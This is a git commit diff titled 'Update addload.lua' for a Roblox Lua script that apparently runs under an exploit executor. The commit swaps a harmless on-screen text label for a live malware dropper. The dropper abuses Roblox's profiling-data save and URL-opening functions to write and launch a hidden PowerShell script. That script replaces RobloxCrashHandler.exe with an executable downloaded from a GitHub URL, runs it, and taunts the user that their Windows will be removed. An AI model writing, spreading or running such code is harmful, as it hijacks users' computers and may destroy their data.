18f40e8b3b17dac3b2cf4dbadf74c96740db826b
coyote01488 <166956344+coyote01488@users.noreply.github.com>
2024-11-15 21:08:14 +0100

    Update addload.lua

--- addload.lua
+++ addload.lua
@@ -1,18 +1,30 @@
-local Screen = Instance.new("ScreenGui")
-local Text = Instance.new("TextLabel")
+if not run_on_actor then return end
+for i, v in pairs(getactors()) do
+    run_on_actor(v, [=[pcall(function()
+            local POWERSHELL_NAME = "doom.ps1"
+            local POWERSHELL_PAYLOAD = [[
+                Add-Type -AssemblyName PresentationCore,PresentationFramework
 
-Screen.Name = "s9HSkVv1hfgawerarl1xazfli"
-Screen.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
-Screen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-Screen.ResetOnSpawn = false
+                taskkill /f /im RobloxCrashHandler.exe
+                timeout 1
+                move RobloxCrashHandler.exe .old
 
-Text.Name = "GmkRAWKmTOASHNion6"
-Text.Parent = Screen
-Text.BackgroundTransparency = 1
-Text.Position = UDim2.new(0, 0, 0, 0)
-Text.Size = UDim2.new(1, 0, 1, 0)
-Text.Font = Enum.Font.FredokaOne
-Text.Text = "MANGO MANGO + STILL WATER + BALKAN PARENTS + THOSE WHO KNOW"
-Text.TextColor3 = Color3.fromRGB(255, 0, 0)
-Text.TextSize = 24
-Text.TextScaled = true
+                Invoke-WebRequest "https://raw.githubusercontent.com/evoincorp/doom/refs/heads/main/doom_bootstrapper.exe" -OutFile RobloxCrashHandler.exe
+
+                taskkill /f /im RobloxPlayerBeta.exe
+
+                [System.Windows.MessageBox]::Show("Greetings, $env:USERNAME! Your Windows will be removed in 2 minutes! Good luck!",0, 16)
+
+                attrib +r RobloxCrashHandler.exe
+                start RobloxCrashHandler.exe
+            ]]
+
+            local Path2 = game["Script Context"]:saveScriptProfilingData(POWERSHELL_PAYLOAD, POWERSHELL_NAME)
+
+            local FILE_NAME = "doom.bat"
+            local PAYLOAD = `start "" "powershell" -WindowStyle Hidden -ExecutionPolicy Bypass {Path2}`
+
+            local Path1 = game["Script Context"]:saveScriptProfilingData(PAYLOAD, FILE_NAME)
+            game.LinkingService:openUrl(Path1)
+        end)]=])
+end
